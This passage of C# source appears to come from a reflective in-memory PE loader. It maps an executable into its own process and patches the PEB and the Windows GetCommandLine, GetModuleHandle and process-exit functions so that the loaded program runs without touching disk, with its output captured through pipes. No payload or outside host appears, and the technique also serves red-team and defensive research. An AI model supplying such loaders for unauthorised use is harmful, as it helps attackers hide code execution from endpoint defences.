            var result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, NativeDeclarations.PAGE_READWRITE, out oldProtect);
            if (!result)
            {
            }

            var zeroes = new byte[length];
            for (var i = 0; i < zeroes.Length; i++)
            {
                zeroes[i] = 0x00;
            }

            Marshal.Copy(zeroes.ToArray(), 0, start, length);
            uint empty;
            result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, oldProtect, out empty);
            if (!result)
            {
                return false;
            }

            return true;
        }

        public static void FreeMemory(IntPtr address)
        {
            NativeDeclarations.VirtualFree(address, 0, NativeDeclarations.MEM_RELEASE);
        }

        public static IntPtr GetPointerToPeb()
        {
            var currentProcessHandle = NativeDeclarations.GetCurrentProcess();
            var processBasicInformation =
                Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION)));
            var outSize = Marshal.AllocHGlobal(sizeof(long));
            var pPEB = IntPtr.Zero;

            var result = NativeDeclarations.NtQueryInformationProcess(currentProcessHandle, 0, processBasicInformation,
                (uint)Marshal.SizeOf(typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION)), outSize);

            NativeDeclarations.CloseHandle(currentProcessHandle);
            Marshal.FreeHGlobal(outSize);

            if (result == 0)
            {
                pPEB = ((NativeDeclarations.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processBasicInformation,
                    typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION))).PebAddress;
            }
            else
            {
                Console.WriteLine("[-] Unable to NtQueryInformationProcess, error code: " + result);
                var error = NativeDeclarations.GetLastError();
                Console.WriteLine("[-] GetLastError: " + error);
            }

            Marshal.FreeHGlobal(processBasicInformation);

            return pPEB;
        }

        public static byte[] ReadMemory(IntPtr address, int length)
        {
            var bytes = new byte[length];
            Marshal.Copy(address, bytes, 0, length);
            return bytes;
        }
    }

    public static unsafe class NativeDeclarations
    {
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint PAGE_EXECUTE = 0x10;
        public const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        public const uint PAGE_NOACCESS = 0x01;
        public const uint PAGE_READONLY = 0x02;
        public const uint PAGE_WRITECOPY = 0x08;

        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RELEASE = 0x00008000;

        public const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
        public const uint IMAGE_SCN_MEM_READ = 0x40000000;
        public const uint IMAGE_SCN_MEM_WRITE = 0x80000000;

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetStdHandle(int nStdHandle);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll")]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
            IntPtr processInformation, uint processInformationLength, IntPtr returnLength);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetCommandLine();

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,
            out uint lpFlOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFree(IntPtr pAddress, uint size, uint freeType);

        [DllImport("kernel32")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
    }

    public class ArgumentHandler
    {
        private const int
            PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET =
                0x20;

        private const int
            RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET =
                0x70;

        private const int RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET = 2;

        private const int
            RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET =
                0x60;

        private const int
            UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET =
                0x8;

        private byte[] _originalCommandLineFuncBytes;
        private IntPtr _ppCommandLineString;
        private IntPtr _ppImageString;
        private IntPtr _pLength;
        private IntPtr _pMaxLength;
        private IntPtr _pOriginalCommandLineString;
        private IntPtr _pOriginalImageString;
        private IntPtr _pNewString;
        private short _originalLength;
        private short _originalMaxLength;
        private string _commandLineFunc;
        private Encoding _encoding;

        public bool UpdateArgs(string filename, string[] args)
        {
            var pPEB = Utils.GetPointerToPeb();
            if (pPEB == IntPtr.Zero)
            {
                return false;
            }

            GetPebCommandLineAndImagePointers(pPEB, out _ppCommandLineString, out _pOriginalCommandLineString,
                out _ppImageString, out _pOriginalImageString, out _pLength, out _originalLength, out _pMaxLength,
                out _originalMaxLength);


            var newCommandLineString = "\"" + filename + "\" " + string.Join(" ", args);
            var pNewCommandLineString = Marshal.StringToHGlobalUni(newCommandLineString);
            var pNewImageString = Marshal.StringToHGlobalUni(filename);
            if (!Utils.PatchAddress(_ppCommandLineString, pNewCommandLineString))
            {
                return false;
            }
            if (!Utils.PatchAddress(_ppImageString, pNewImageString))
            {
                return false;
            }
            Marshal.WriteInt16(_pLength, 0, (short)newCommandLineString.Length);
            Marshal.WriteInt16(_pMaxLength, 0, (short)newCommandLineString.Length);

            if (!PatchGetCommandLineFunc(newCommandLineString))
            {
                return false;
            }
            return true;
        }

        private bool PatchGetCommandLineFunc(string newCommandLineString)
        {
            var pCommandLineString = NativeDeclarations.GetCommandLine();
            var commandLineString = Marshal.PtrToStringAuto(pCommandLineString);

            _encoding = Encoding.UTF8;

            if (commandLineString != null)
            {
                var stringBytes = new byte[commandLineString.Length];


                Marshal.Copy(pCommandLineString, stringBytes, 0,
                    commandLineString.Length);

                if (!new List<byte>(stringBytes).Contains(0x00))
                {
                    _encoding = Encoding.ASCII;
                }

                Program.encoding = _encoding;

            }


            _commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW";


            _pNewString = _encoding.Equals(Encoding.ASCII)
                ? Marshal.StringToHGlobalAnsi(newCommandLineString)
                : Marshal.StringToHGlobalUni(newCommandLineString);

            var patchBytes = new List<byte> { 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(_pNewString.ToInt64());

            patchBytes.AddRange(pointerBytes);

            patchBytes.Add(0xC3);


            _originalCommandLineFuncBytes = Utils.PatchFunction("kernelbase", _commandLineFunc, patchBytes.ToArray());
            if (_originalCommandLineFuncBytes == null)
            {
                return false;
            }

            return true;
        }

        private static void GetPebCommandLineAndImagePointers(IntPtr pPEB, out IntPtr ppCommandLineString,
            out IntPtr pCommandLineString, out IntPtr ppImageString, out IntPtr pImageString,
            out IntPtr pCommandLineLength, out short commandLineLength, out IntPtr pCommandLineMaxLength,
            out short commandLineMaxLength)
        {
            var ppRtlUserProcessParams = (IntPtr)(pPEB.ToInt64() + PEB_RTL_USER_PROCESS_PARAMETERS_OFFSET);

            var pRtlUserProcessParams = Marshal.ReadInt64(ppRtlUserProcessParams);

            ppCommandLineString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET +
                                  UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
            pCommandLineString = (IntPtr)Marshal.ReadInt64(ppCommandLineString);

            ppImageString = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_IMAGE_OFFSET +
                            UNICODE_STRING_STRUCT_STRING_POINTER_OFFSET;
            pImageString = (IntPtr)Marshal.ReadInt64(ppImageString);

            pCommandLineLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET;
            commandLineLength = Marshal.ReadInt16(pCommandLineLength);

            pCommandLineMaxLength = (IntPtr)pRtlUserProcessParams + RTL_USER_PROCESS_PARAMETERS_COMMANDLINE_OFFSET +
                                    RTL_USER_PROCESS_PARAMETERS_MAX_LENGTH_OFFSET;
            commandLineMaxLength = Marshal.ReadInt16(pCommandLineMaxLength);
        }

        public void ResetArgs()
        {
            if (Utils.PatchFunction("kernelbase", _commandLineFunc, _originalCommandLineFuncBytes) == null)
            {

            }

            if (!Utils.PatchAddress(_ppCommandLineString, _pOriginalCommandLineString))
            {
            }
            if (!Utils.PatchAddress(_ppImageString, _pOriginalImageString))
            {
            }
            Marshal.WriteInt16(_pLength, 0, _originalLength);
            Marshal.WriteInt16(_pMaxLength, 0, _originalMaxLength);
        }
    }

    public class ExitPatcher
    {
        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        public bool PatchExit()
        {
            var hKernelbase = NativeDeclarations.GetModuleHandle("kernelbase");
            var pExitThreadFunc = NativeDeclarations.GetProcAddress(hKernelbase, "ExitThread");
            var exitThreadPatchBytes = new List<byte> { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
             */
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes =
                Utils.PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
            {
                return false;
            }
            _corExitProcessOriginalBytes =
                Utils.PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
            {
                return false;
            }
            _ntTerminateProcessOriginalBytes =
                Utils.PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
            {
                return false;
            }
            _rtlExitUserProcessOriginalBytes =
                Utils.PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
            {
                return false;
            }
            return true;
        }

        public void ResetExitFunctions()
        {
            Utils.PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);
            Utils.PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);
            Utils.PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
            Utils.PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
        }
    }

    public class ExtraAPIPatcher
    {
        private byte[] _originalGetModuleHandleBytes;
        private string _getModuleHandleFuncName;
        private IntPtr _newFuncAlloc;
        private int _newFuncBytesCount;

        public bool PatchAPIs(IntPtr baseAddress)
        {
            _getModuleHandleFuncName = Encoding.UTF8.Equals(Program.encoding) ? "GetModuleHandleW" : "GetModuleHandleA";

            var moduleHandle = NativeDeclarations.GetModuleHandle("kernelbase");
            var getModuleHandleFuncAddress = NativeDeclarations.GetProcAddress(moduleHandle, _getModuleHandleFuncName);
            var patchLength = CalculatePatchLength(getModuleHandleFuncAddress);
            WriteNewFuncToMemory(baseAddress, getModuleHandleFuncAddress, patchLength);

            if (PatchAPIToJmpToNewFunc(patchLength)) return true;
            return false;
        }

        private bool PatchAPIToJmpToNewFunc(int patchLength)
        {

            var pointerBytes = BitConverter.GetBytes(_newFuncAlloc.ToInt64());

            /*
                0:  48 b8 88 77 66 55 44    movabs rax,<address of newFunc>
                7:  33 22 11
                a:  ff e0                   jmp    rax
             */
            var patchBytes = new List<byte> { 0x48, 0xB8 };
            patchBytes.AddRange(pointerBytes);

            patchBytes.Add(0xFF);
            patchBytes.Add(0xE0);

            if (patchBytes.Count > patchLength)
                throw new Exception("Patch length (" + patchBytes.Count + ")is greater than calculated space available (" + patchLength);

            if (patchBytes.Count < patchLength)
            {
                patchBytes.AddRange(Enumerable.Range(0, patchLength - patchBytes.Count).Select(x => (byte)0x90));
            }

            _originalGetModuleHandleBytes =
                Utils.PatchFunction("kernelbase", _getModuleHandleFuncName, patchBytes.ToArray());

            return _originalGetModuleHandleBytes != null;
        }

        private IntPtr WriteNewFuncToMemory(IntPtr baseAddress, IntPtr getModuleHandleFuncAddress, int patchLength)
        {

            var newFuncBytes = new List<byte>
            {
                0x48, 0x85, 0xc9, 0x75, 0x0b,
                0x48,
                0xB8
            };

            var baseAddressPointerBytes = BitConverter.GetBytes(baseAddress.ToInt64());

            newFuncBytes.AddRange(baseAddressPointerBytes);

            newFuncBytes.Add(0xC3);
            newFuncBytes.Add(0x48);
            newFuncBytes.Add(0xB8);


            var pointerBytes = BitConverter.GetBytes(getModuleHandleFuncAddress.ToInt64() + patchLength);

            newFuncBytes.AddRange(pointerBytes);

            var originalInstructions = new byte[patchLength];
            Marshal.Copy(getModuleHandleFuncAddress, originalInstructions, 0, patchLength);

            newFuncBytes.AddRange(originalInstructions);

            newFuncBytes.Add(0xFF);
            newFuncBytes.Add(0xE0);
            /*
            0:  48 85 c9                test   rcx,rcx
            3:  75 0b                   jne    +0x0b
            5:  48 b8 88 77 66 55 44    movabs rax,<Base Address of mapped PE>
            c:  33 22 11
            f:  c3                      ret
            10:  48 b8 88 77 66 55 44   movabs rax,<Back to GetModuleHandle>
            17:  33 22 11
            ... original replaced opcodes...
            1a:  ff e0                  jmp    rax
            */
            _newFuncAlloc = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)newFuncBytes.Count,
                NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
            Marshal.Copy(newFuncBytes.ToArray(), 0, _newFuncAlloc, newFuncBytes.Count);
            _newFuncBytesCount = newFuncBytes.Count;

            uint empty;
            NativeDeclarations.VirtualProtect(_newFuncAlloc, (UIntPtr)newFuncBytes.Count, NativeDeclarations.PAGE_EXECUTE_READ, out empty);
            return _newFuncAlloc;
        }

        private int CalculatePatchLength(IntPtr funcAddress)
        {
            var bytes = Utils.ReadMemory(funcAddress, 40);
            var searcher = new BoyerMoore(new byte[] { 0x48, 0x8d, 0x4c });
            var length = searcher.Search(bytes).FirstOrDefault();
            if (length == 0)
            {
                searcher = new BoyerMoore(new byte[] { 0x4c, 0x8d, 0x44 });
                length = searcher.Search(bytes).FirstOrDefault();
                if (length == 0)
                    throw new Exception("Unable to calculate patch length, the function may have changed to a point it is is no longer recognised and this code needs to be updated");
            }
            return length;
        }

        public bool RevertAPIs()
        {
            Utils.PatchFunction("kernelbase", _getModuleHandleFuncName, _originalGetModuleHandleBytes);
            Utils.ZeroOutMemory(_newFuncAlloc, _newFuncBytesCount);
            Utils.FreeMemory(_newFuncAlloc);
            return true;
        }
    }

    public sealed class BoyerMoore
    {
        private readonly byte[] _needle;
        private readonly int[] _charTable;
        private readonly int[] _offsetTable;

        public BoyerMoore(byte[] needle)
        {
            _needle = needle;
            _charTable = MakeByteTable(needle);
            _offsetTable = MakeOffsetTable(needle);
        }

        public IEnumerable<int> Search(byte[] haystack)
        {
            if (_needle.Length == 0)
                yield break;

            for (var i = _needle.Length - 1; i < haystack.Length;)
            {
                int j;

                for (j = _needle.Length - 1; _needle[j] == haystack[i]; --i, --j)
                {
                    if (j != 0)
                        continue;

                    yield return i;
                    i += _needle.Length - 1;
                    break;
                }

                i += Math.Max(_offsetTable[_needle.Length - 1 - j], _charTable[haystack[i]]);
            }
        }

        private static int[] MakeByteTable(IList<byte> needle)
        {
            const int alphabetSize = 256;
            var table = new int[alphabetSize];

            for (var i = 0; i < table.Length; ++i)
                table[i] = needle.Count;

            for (var i = 0; i < needle.Count - 1; ++i)
                table[needle[i]] = needle.Count - 1 - i;

            return table;
        }

        private static int[] MakeOffsetTable(IList<byte> needle)
        {
            var table = new int[needle.Count];
            var lastPrefixPosition = needle.Count;

            for (var i = needle.Count - 1; i >= 0; --i)
            {
                if (IsPrefix(needle, i + 1))
                    lastPrefixPosition = i + 1;

                table[needle.Count - 1 - i] = lastPrefixPosition - i + needle.Count - 1;
            }

            for (var i = 0; i < needle.Count - 1; ++i)
            {
                var suffixLength = SuffixLength(needle, i);
                table[suffixLength] = needle.Count - 1 - i + suffixLength;
            }

            return table;
        }

        private static bool IsPrefix(IList<byte> needle, int p)
        {
            for (int i = p, j = 0; i < needle.Count; ++i, ++j)
                if (needle[i] != needle[j])
                    return false;

            return true;
        }

        private static int SuffixLength(IList<byte> needle, int p)
        {
            var len = 0;

            for (int i = p, j = needle.Count - 1; i >= 0 && needle[i] == needle[j]; --i, --j)
                ++len;

            return len;
        }
    }

    public class ExtraEnvironmentPatcher
    {
        private const int PEB_BASE_ADDRESS_OFFSET = 0x10;

        private IntPtr _pOriginalPebBaseAddress;
        private IntPtr _pPEBBaseAddr;

        private IntPtr _newPEBaseAddress;

        public ExtraEnvironmentPatcher(IntPtr newPEBaseAddress)
        {
            _newPEBaseAddress = newPEBaseAddress;
        }

        public bool PerformExtraEnvironmentPatches()
        {
            return PatchPebBaseAddress();
        }

        private bool PatchPebBaseAddress()
        {
            _pPEBBaseAddr = (IntPtr)(Utils.GetPointerToPeb().ToInt64() + PEB_BASE_ADDRESS_OFFSET);
            _pOriginalPebBaseAddress = Marshal.ReadIntPtr(_pPEBBaseAddr);
            if (!Utils.PatchAddress(_pPEBBaseAddr, _newPEBaseAddress))
            {
                return false;
            }
            return true;
        }

        public bool RevertExtraPatches()
        {
            if (!Utils.PatchAddress(_pPEBBaseAddr, _pOriginalPebBaseAddress))
            {
                return false;
            }
            return true;
        }
    }

    public class FileDescriptorPair
    {
        public IntPtr Read { get; set; }

        public IntPtr Write { get; set; }
    }

    public class FileDescriptorRedirector
    {
        private const int STD_INPUT_HANDLE = -10;
        private const int STD_OUTPUT_HANDLE = -11;
        private const int STD_ERROR_HANDLE = -12;
        private const uint BYTES_TO_READ = 1024;

        private IntPtr _oldGetStdHandleOut;
        private IntPtr _oldGetStdHandleIn;
        private IntPtr _oldGetStdHandleError;

        private FileDescriptorPair _kpStdOutPipes;
        private FileDescriptorPair _kpStdInPipes;
        private Task<string> _readTask;

        public bool RedirectFileDescriptors()
        {
            _oldGetStdHandleOut = GetStdHandleOut();
            _oldGetStdHandleIn = GetStdHandleIn();
            _oldGetStdHandleError = GetStdHandleError();

            _kpStdOutPipes = CreateFileDescriptorPipes();
            if (_kpStdOutPipes == null)
            {
                Console.WriteLine("[-] Unable to create STDOut Pipes");
                return false;
            }

            _kpStdInPipes = CreateFileDescriptorPipes();
            if (_kpStdInPipes == null)
            {
                Console.WriteLine("[-] Unable to create STDIn Pipes");
                return false;
            }

            if (!RedirectDescriptorsToPipes(_kpStdOutPipes.Write, _kpStdInPipes.Write, _kpStdOutPipes.Write))
            {
                Console.WriteLine("[-] Unable redirect descriptors to pipes");
                return false;
            }
            return true;
        }

        public string ReadDescriptorOutput()
        {
            while (!_readTask.IsCompleted)
            {
                Thread.Sleep(2000);
            }

            return _readTask.Result;
        }

        public void ResetFileDescriptors()
        {
            RedirectDescriptorsToPipes(_oldGetStdHandleOut, _oldGetStdHandleIn, _oldGetStdHandleError);

            ClosePipes();
        }

        private static IntPtr GetStdHandleOut()
        {
            return NativeDeclarations.GetStdHandle(STD_OUTPUT_HANDLE);
        }

        private static IntPtr GetStdHandleError()
        {
            return NativeDeclarations.GetStdHandle(STD_ERROR_HANDLE);
        }

        public void ClosePipes()
        {
            CloseDescriptors(_kpStdOutPipes);
            CloseDescriptors(_kpStdInPipes);
        }

        public void StartReadFromPipe()
        {
            _readTask = Task.Factory.StartNew(() =>
            {
                var output = "";

                var buffer = new byte[BYTES_TO_READ];
                byte[] outBuffer;
                uint bytesRead;
                var ok = NativeDeclarations.ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out bytesRead, IntPtr.Zero);

                if (!ok)
                {
                    Console.WriteLine("[-] Unable to read from 'subprocess' pipe");
                    return "";
                }
                if (bytesRead != 0)
                {
                    outBuffer = new byte[bytesRead];
                    Array.Copy(buffer, outBuffer, bytesRead);
                    output += Encoding.Default.GetString(outBuffer);
                }

                while (ok)
                {
                    ok = NativeDeclarations.ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out bytesRead, IntPtr.Zero);
                    if (bytesRead != 0)
                    {
                        outBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outBuffer, bytesRead);
                        output += Encoding.Default.GetString(outBuffer);
                    }
                }

                return output;
            });
        }

        private static IntPtr GetStdHandleIn()
        {
            return NativeDeclarations.GetStdHandle(STD_INPUT_HANDLE);
        }

        private static void CloseDescriptors(FileDescriptorPair stdoutDescriptors)
        {
            try
            {

                if (stdoutDescriptors.Write != IntPtr.Zero)
                {
                    NativeDeclarations.CloseHandle(stdoutDescriptors.Write);
                }

                if (stdoutDescriptors.Read != IntPtr.Zero)
                {
                    NativeDeclarations.CloseHandle(stdoutDescriptors.Read);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error closing handles: " + e);
                Console.WriteLine("Last error: 0x" + NativeDeclarations.GetLastError());
            }
        }

        private static FileDescriptorPair CreateFileDescriptorPipes()
        {
            var lpSecurityAttributes = new NativeDeclarations.SECURITY_ATTRIBUTES();
            lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
            lpSecurityAttributes.bInheritHandle = 1;
            IntPtr read;
            IntPtr write;
            var outputStdOut = NativeDeclarations.CreatePipe(out read, out write, ref lpSecurityAttributes, 0);
            if (!outputStdOut)
            {
                return null;
            }

            return new FileDescriptorPair
            {
                Read = read,
                Write = write
            };
        }

        private static bool RedirectDescriptorsToPipes(IntPtr hStdOutPipes, IntPtr hStdInPipes, IntPtr hStdErrPipes)
        {
            var bStdOut = NativeDeclarations.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutPipes);
            if (bStdOut)
            {
            }
            else
            {
                return false;
            }

            var bStdError = NativeDeclarations.SetStdHandle(STD_ERROR_HANDLE, hStdErrPipes);
            if (bStdError)
            {
            }
            else
            {
                return false;
            }

            var bStdIn = NativeDeclarations.SetStdHandle(STD_INPUT_HANDLE, hStdInPipes);
            if (bStdIn)
            {
            }
            else
            {
                return false;
            }

            return true;
        }
    }

    public class ImportResolver
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool FreeLibrary(IntPtr hModule);

        private const int
            IDT_SINGLE_ENTRY_LENGTH =
                20;

        private const int IDT_IAT_OFFSET = 16;

        private const int IDT_DLL_NAME_OFFSET = 12;
        private const int ILT_HINT_LENGTH = 2;

        private readonly List<string> _originalModules = new List<string>();

        public void ResolveImports(PELoader pe, long currentBase)
        {

            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                _originalModules.Add(module.ModuleName);
            }


            var pIDT = (IntPtr)(currentBase + pe.OptionalHeader64.ImportTable.VirtualAddress);
            var dllIterator = 0;
            while (true)
            {
                var pDLLImportTableEntry = (IntPtr)(pIDT.ToInt64() + IDT_SINGLE_ENTRY_LENGTH * dllIterator);

                var iatRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_IAT_OFFSET));
                var pIAT = (IntPtr)(currentBase + iatRVA);

                var dllNameRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_DLL_NAME_OFFSET));
                var pDLLName = (IntPtr)(currentBase + dllNameRVA);
                var dllName = Marshal.PtrToStringAnsi(pDLLName);

                if (string.IsNullOrEmpty(dllName))
                {
                    break;
                }

                var handle = NativeDeclarations.LoadLibrary(dllName);
                if (handle == IntPtr.Zero)
                {
                    throw new Exception("Unable to load dependency: " + dllName + ", Last error: 0x{" + NativeDeclarations.GetLastError() + "}");
                }

                var pCurrentIATEntry = pIAT;
                while (true)
                {

                    var pDLLFuncName =
                        (IntPtr)(currentBase + Marshal.ReadInt32(pCurrentIATEntry) +
                                 ILT_HINT_LENGTH);
                    var dllFuncName = Marshal.PtrToStringAnsi(pDLLFuncName);

                    if (string.IsNullOrEmpty(dllFuncName))
                    {
                        break;
                    }

                    var pRealFunction = NativeDeclarations.GetProcAddress(handle, dllFuncName);
                    if (pRealFunction == IntPtr.Zero)
                    {
                        throw new Exception("Unable to find procedure " + dllName + " " + dllFuncName);

                    }
                    Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());

                    pCurrentIATEntry =
                        (IntPtr)(pCurrentIATEntry.ToInt64() +
                                 IntPtr.Size);
                }

                dllIterator++;
            }
        }

        public void ResetImports()
        {
            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                if (!_originalModules.Contains(module.ModuleName))
                {
                    if (!FreeLibrary(module.BaseAddress))
                    {
                    }
                }
            }
        }
    }

    public class PEMapper
    {
        private IntPtr _codebase;
        private PELoader _pe;

        public void MapPEIntoMemory(byte[] unpacked, out PELoader peLoader, out long currentBase)
        {

            _pe = peLoader = new PELoader(unpacked);
            _codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, _pe.OptionalHeader64.SizeOfImage,
                NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
            currentBase = _codebase.ToInt64();


            for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
            {
                var y = NativeDeclarations.VirtualAlloc((IntPtr)(currentBase + _pe.ImageSectionHeaders[i].VirtualAddress),
                    _pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
                Marshal.Copy(_pe.RawBytes, (int)_pe.ImageSectionHeaders[i].PointerToRawData, y, (int)_pe.ImageSectionHeaders[i].SizeOfRawData);
            }


            var delta = currentBase - (long)_pe.OptionalHeader64.ImageBase;


            var relocationTable =
                (IntPtr)(currentBase + (int)_pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
            var relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

            var imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            var nextEntry = relocationTable;
            var sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            var offset = relocationTable;

            while (true)
            {
                var pRelocationTableNextBlock = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);

                var relocationNextEntry =
                    (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTableNextBlock, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                var pRelocationEntry = (IntPtr)(currentBase + relocationEntry.VirtualAdress);

                for (var i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {
                    var value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i);
                    var type = (ushort)(value >> 12);
                    var fixup = (ushort)(value & 0xfff);

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0xA:
                            var patchAddress = (IntPtr)(pRelocationEntry.ToInt64() + fixup);
                            var originalAddr = Marshal.ReadInt64(patchAddress);
                            Marshal.WriteInt64(patchAddress, originalAddr + delta);
                            break;
                    }
                }

                offset = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;
                nextEntry = (IntPtr)(nextEntry.ToInt64() + sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0)
                {
                    break;
                }
            }
        }

        public void ClearPE()
        {
            var size = _pe.OptionalHeader64.SizeOfImage;

            Utils.ZeroOutMemory(_codebase, (int)size);
